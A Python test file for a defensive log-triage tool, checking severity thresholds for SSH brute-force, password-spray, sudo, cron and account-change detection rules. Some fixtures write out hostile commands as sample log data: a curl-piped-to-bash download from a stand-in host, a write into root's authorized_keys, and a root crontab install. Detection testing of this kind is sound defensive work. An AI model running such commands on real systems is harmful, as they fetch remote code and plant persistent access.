"""Rule tests.

Each rule is exercised at its threshold, just below it, and at every escalation
step, because the interesting bug in a detection rule is not "does it fire" but
"does it fire at the right severity for the right reason".
"""

import datetime

from _util import (
    YEAR,
    cron_command,
    feed,
    group_membership,
    line,
    password_changed,
    ssh_accepted,
    ssh_failed,
    ssh_failed_from_ips,
    ssh_failed_variants,
    ssh_invalid_users,
    su_to_root,
    sudo_command,
    sudo_failure,
    user_created,
)

from logtriage.options import Options
from logtriage.rules import (
    AccountCreated,
    OffHoursLogin,
    PasswordChanged,
    PrivilegedGroupChange,
    SshBruteForceSingleSource,
    SshDistributedBruteForce,
    SshFailedThenAccepted,
    SshPasswordSpray,
    SshRootLogin,
    SshUserEnumeration,
    SudoFailedAttempts,
    SudoPayloadFetch,
    SudoSensitiveCommand,
    SudoShellEscape,
    SuspiciousCron,
    SuToRoot,
    default_rules,
)


def options(**overrides) -> Options:
    base = Options(window=datetime.timedelta(minutes=10))
    for key, value in overrides.items():
        setattr(base, key, value)
    return base


# --- brute force from one source ----------------------------------------

def test_brute_force_fires_at_the_threshold():
    findings = feed(SshBruteForceSingleSource(options()), ssh_failed(5))
    assert len(findings) == 1
    assert findings[0].severity == "medium"
    assert findings[0].source == "203.0.113.7"
    assert findings[0].count == 5
    assert findings[0].total == 5


def test_brute_force_stays_quiet_below_the_threshold():
    assert feed(SshBruteForceSingleSource(options()), ssh_failed(4)) == []


def test_brute_force_escalates_to_high_and_critical():
    high = feed(SshBruteForceSingleSource(options()), ssh_failed(15, step=20))
    critical = feed(SshBruteForceSingleSource(options()), ssh_failed(50, step=5))
    assert high[0].severity == "high"
    assert critical[0].severity == "critical"


def test_brute_force_aggregates_into_one_finding():
    findings = feed(SshBruteForceSingleSource(options()), ssh_failed(20))
    assert len(findings) == 1
    assert findings[0].total == 20
    assert findings[0].count == 20
    assert findings[0].severity == "high"


def test_brute_force_keeps_only_five_evidence_lines():
    finding = feed(SshBruteForceSingleSource(options()), ssh_failed(20))[0]
    assert len(finding.evidence) == 5
    # The window held twenty lines; five are shown, and the report says so
    # instead of quietly presenting five as the whole story.
    assert finding.suppressed_evidence == 15


def test_brute_force_ignores_attempts_that_aged_out_of_the_window():
    # One attempt every 200 seconds: never more than three inside ten minutes.
    assert feed(SshBruteForceSingleSource(options()), ssh_failed(10, step=200)) == []


def test_brute_force_is_tracked_per_source():
    lines = ssh_failed(3, ip="203.0.113.7") + ssh_failed(3, ip="198.51.100.9", start=100)
    assert feed(SshBruteForceSingleSource(options()), lines) == []


def test_brute_force_records_the_accounts_tried():
    lines = ssh_failed(3, user="deploy") + ssh_failed(3, user="root", start=60)
    finding = feed(SshBruteForceSingleSource(options()), lines)[0]
    assert sorted(finding.actors) == ["deploy", "root"]


def test_brute_force_severity_follows_the_rate_not_the_total():
    # 40 attempts, but spread out so that never more than ten fall in the window.
    findings = feed(SshBruteForceSingleSource(options()), ssh_failed(40, step=120))
    assert findings[0].severity == "medium"
    assert findings[0].total == 40


# --- password spraying ---------------------------------------------------

def test_spray_fires_on_many_accounts_from_one_source():
    finding = feed(SshPasswordSpray(options()), ssh_failed_variants(5))[0]
    assert finding.severity == "high"
    assert finding.count == 5
    assert "5 distinct accounts" in finding.summary


def test_spray_stays_quiet_below_the_threshold():
    assert feed(SshPasswordSpray(options()), ssh_failed_variants(4)) == []


def test_spray_escalates_when_it_covers_many_accounts():
    finding = feed(SshPasswordSpray(options()), ssh_failed_variants(20))[0]
    assert finding.severity == "critical"


def test_spray_does_not_fire_when_one_account_is_retried():
    assert feed(SshPasswordSpray(options()), ssh_failed(20)) == []


# --- username enumeration ------------------------------------------------

def test_enumeration_fires_on_invalid_names():
    finding = feed(SshUserEnumeration(options()), ssh_invalid_users(5))[0]
    assert finding.severity == "medium"
    assert finding.count == 5


def test_enumeration_stays_quiet_below_the_threshold():
    assert feed(SshUserEnumeration(options()), ssh_invalid_users(4)) == []


def test_enumeration_ignores_real_accounts():
    assert feed(SshUserEnumeration(options()), ssh_failed(10)) == []


# --- distributed attempts -------------------------------------------------

def test_distributed_attack_fires_on_many_sources_for_one_account():
    finding = feed(SshDistributedBruteForce(options()), ssh_failed_from_ips(5))[0]
    assert finding.severity == "high"
    assert finding.source == "deploy"
    assert finding.count == 5


def test_distributed_attack_stays_quiet_below_the_threshold():
    assert feed(SshDistributedBruteForce(options()), ssh_failed_from_ips(4)) == []


def test_distributed_attack_escalates_on_a_botnet():
    finding = feed(SshDistributedBruteForce(options()), ssh_failed_from_ips(20))[0]
    assert finding.severity == "critical"


# --- successful login after failures --------------------------------------

def test_one_failed_attempt_then_success_is_a_medium():
    findings = feed(SshFailedThenAccepted(options()),
                    ssh_failed(1) + [ssh_accepted(user="deploy", offset=60)])
    assert findings[0].severity == "medium"
    assert "after 1 failed attempt" in findings[0].summary


def test_several_failures_then_success_is_a_high():
    findings = feed(SshFailedThenAccepted(options()),
                    ssh_failed(3) + [ssh_accepted(user="deploy", offset=120)])
    assert findings[0].severity == "high"


def test_a_full_dictionary_then_success_is_critical():
    findings = feed(SshFailedThenAccepted(options()),
                    ssh_failed(6) + [ssh_accepted(user="deploy", offset=200)])
    assert findings[0].severity == "critical"


def test_success_without_failures_is_not_reported():
    findings = feed(SshFailedThenAccepted(options()),
                    [ssh_accepted(user="deploy", offset=0)])
    assert findings == []


def test_success_after_age_failures_is_not_linked():
    findings = feed(SshFailedThenAccepted(options()),
                    ssh_failed(5, start=0) + [ssh_accepted(user="deploy", offset=3600)])
    assert findings == []


def test_publickey_login_after_failures_is_reported_too():
    findings = feed(SshFailedThenAccepted(options()),
                    ssh_failed(2) + [ssh_accepted(user="deploy", offset=90, method="publickey")])
    assert findings[0].severity == "high"


# --- root login -----------------------------------------------------------

def test_root_login_over_ssh_is_high():
    finding = feed(SshRootLogin(options()), [ssh_accepted(user="root", offset=0)])[0]
    assert finding.severity == "high"
    assert finding.source == "203.0.113.7"


def test_normal_login_is_not_a_root_login():
    assert feed(SshRootLogin(options()), [ssh_accepted(user="deploy", offset=0)]) == []


# --- sudo (privilege escalation) -----------------------------------------

def test_sudo_shell_is_reported():
    finding = feed(SudoShellEscape(options()),
                   [sudo_command(command="/bin/bash -c 'id'")])[0]
    assert finding.severity == "high"
    assert finding.source == "deploy"


def test_sudo_interpreter_is_reported():
    finding = feed(SudoShellEscape(options()),
                   [sudo_command(command="/usr/bin/python3 /tmp/x.py")])[0]
    assert finding.severity == "high"


def test_sudo_ordinary_command_is_not_a_shell_escape():
    assert feed(SudoShellEscape(options()),
                [sudo_command(command="/usr/bin/apt-get update")]) == []


def test_sudo_write_to_authorized_keys_is_high():
    finding = feed(SudoSensitiveCommand(options()),
                   [sudo_command(command="/bin/echo key >> /root/.ssh/authorized_keys")])[0]
    assert finding.severity == "high"
    assert "authorized_keys" in finding.summary


def test_sudo_download_piped_to_shell_is_high():
    finding = feed(SudoPayloadFetch(options()),
                   [sudo_command(command="/bin/bash -c 'curl -s http://198.51.100.9/x.sh | bash'")])[0]
    assert finding.severity == "high"


def test_sudo_download_alone_is_medium():
    finding = feed(SudoPayloadFetch(options()),
                   [sudo_command(command="/usr/bin/curl -o /tmp/x http://198.51.100.9/x")])[0]
    assert finding.severity == "medium"


def test_sudo_writing_a_cron_table_is_high():
    finding = feed(SudoSensitiveCommand(options()),
                   [sudo_command(command="/usr/bin/crontab -u root /tmp/cron")])[0]
    assert finding.severity == "high"


def test_restarting_a_service_is_not_a_sensitive_command():
    assert feed(SudoSensitiveCommand(options()),
                [sudo_command(command="/usr/bin/systemctl restart nginx")]) == []


def test_repeated_sudo_failures_escalate():
    medium = feed(SudoFailedAttempts(options()), [sudo_failure(offset=i * 10) for i in range(3)])
    high = feed(SudoFailedAttempts(options()), [sudo_failure(offset=i * 10) for i in range(9)])
    critical = feed(SudoFailedAttempts(options()), [sudo_failure(offset=i * 10) for i in range(30)])
    assert medium[0].severity == "medium"
    assert high[0].severity == "high"
    assert critical[0].severity == "critical"


def test_two_sudo_failures_stay_quiet():
    assert feed(SudoFailedAttempts(options()), [sudo_failure(offset=i * 10) for i in range(2)]) == []


def test_failed_su_counts_towards_the_sudo_threshold():
    lines = [line("FAILED su for root by deploy", offset_seconds=i * 10, process="su", pid=2050)
             for i in range(3)]
    findings = feed(SudoFailedAttempts(options()), lines)
    assert findings[0].severity == "medium"
    assert findings[0].source == "deploy"


def test_su_to_root_is_reported():
    finding = feed(SuToRoot(options()), [su_to_root("deploy")])[0]
    assert finding.severity == "medium"
    assert finding.source == "deploy"


def test_root_running_su_to_root_is_not_reported():
    assert feed(SuToRoot(options()), [su_to_root("root")]) == []


def test_su_to_an_ordinary_user_is_not_reported():
    line_text = line("pam_unix(su:session): session opened for user deploy(uid=1000) by "
                     "admin(uid=1000)", process="su", pid=2051)
    assert feed(SuToRoot(options()), [line_text]) == []


# --- account changes ------------------------------------------------------

def test_new_account_is_high():
    finding = feed(AccountCreated(options()), [user_created("mallory")])[0]
    assert finding.severity == "high"
    assert finding.source == "mallory"


def test_new_account_is_deduplicated_into_one_finding():
    findings = feed(AccountCreated(options()),
                    [user_created("mallory", offset=0), user_created("mallory", offset=60)])
    assert len(findings) == 1
    assert findings[0].total == 2


def test_added_to_sudo_group_is_high():
    finding = feed(PrivilegedGroupChange(options()), [group_membership("mallory", "sudo")])[0]
    assert finding.severity == "high"
    assert "administrative group" in finding.summary


def test_added_to_a_normal_group_is_low():
    finding = feed(PrivilegedGroupChange(options()), [group_membership("mallory", "developers")])[0]
    assert finding.severity == "low"


def test_password_change_is_medium():
    finding = feed(PasswordChanged(options()), [password_changed("mallory")])[0]
    assert finding.severity == "medium"


# --- cron -----------------------------------------------------------------

def test_cron_running_a_download_is_high():
    finding = feed(SuspiciousCron(options()),
                   [cron_command("root", "curl -s http://198.51.100.9/x.sh | bash")])[0]
    assert finding.severity == "high"


def test_a_quiet_backup_job_is_not_reported():
    findings = feed(SuspiciousCron(options()), [cron_command("root", "/usr/local/bin/backup.sh")])
    assert findings == []


def test_cron_rule_counts_what_it_looked_at():
    rule = SuspiciousCron(options())
    feed(rule, [cron_command("root", "/usr/local/bin/backup.sh")])
    assert rule.evaluated == 1


# --- context --------------------------------------------------------------

def test_login_at_three_in_the_morning_is_flagged_as_context():
    night = line("Accepted password for deploy from 203.0.113.7 port 1 ssh2",
                 offset_seconds=(3 * 3600) - (18 * 3600))
    finding = feed(OffHoursLogin(options()), [night])[0]
    assert finding.severity == "info"


def test_login_during_the_day_is_not_flagged():
    day = line("Accepted password for deploy from 203.0.113.7 port 1 ssh2", offset_seconds=0)
    assert feed(OffHoursLogin(options()), [day]) == []


# --- catalogue ------------------------------------------------------------

def test_catalogue_is_complete_and_unique():
    rules = default_rules(options())
    ids = [rule.id for rule in rules]
    assert len(ids) == len(set(ids))
    assert len(rules) == 16
    assert all(rule.title for rule in rules)
    assert all(rule.remediation for rule in rules)


def test_every_rule_starts_with_no_findings():
    for rule in default_rules(options()):
        assert rule.findings() == []
        assert rule.evaluated == 0


def test_rules_survive_an_empty_log():
    for rule in default_rules(options()):
        rule.finish()
        assert rule.findings() == []
